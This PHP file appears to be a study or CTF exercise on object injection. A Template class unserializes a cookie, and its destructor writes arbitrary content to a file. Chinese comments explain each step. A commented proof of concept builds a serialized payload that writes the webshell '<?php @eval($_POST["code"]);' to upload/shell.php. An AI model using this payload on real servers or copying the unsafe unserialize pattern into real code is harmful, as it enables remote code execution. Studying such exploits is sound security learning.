<?php
    
class Template {
    var $cacheFile = "cache.txt";
    var $template = "<div>Welcome back %s</div>";   //%s代表占位符，拼接字符串，与python类似
    function __construct($data = null) {
        $data = $this->loadData($data);   //$data反序列化后是一个Template对象
        $this->render($data);   //理解为一个实例
    }
    function loadData($data) {
        return unserialize($data);   //$data值是一个序列化结果
        return [];   //[]代表一个空数组，此处不会执行
    }
    function createCache($file = null, $tpl = null) {
        $file = $file ?: $this->cacheFile;   //三元运算符 ?: ,A?B:C，如果A,则B,否则C；A?:B，如果A,则A,否则B
        $tpl = $tpl ?: $this->template;
        file_put_contents($file, $tpl);   //在file文件里面输出tpl，目标写木马
    }
    function render($data) {
        echo sprintf($this->template, htmlspecialchars($data['name']));   //此处$data只能是一个数组，sprintf拼接字符串，htmlspecialchars代表实体字符编码
    }
    
    //此处代码会调用两次，第一次反序列化调用，第二次实例化完调用
    function __destruct() {
        $this->createCache();
    }
}
new Template($_COOKIE['data']);   //数组包含实例
    
    
// poc
// class Template{
//     var $cacheFile = "upload/shell.php";
//     var $template = '<?php @eval($_POST["code"]);';
// }
// $t = new Template();
// $a = array($t);
// echo urlencode(serialize($a));
// echo serialize($a);
// echo $a['addr'];
// echo "template 模板";

// a:1:{i:0;O:8:"Template":2:{s:9:"cacheFile";s:17:"upload/shelll.php";s:8:"template";s:31:"<?php @eval($_POST["code"]);123";}}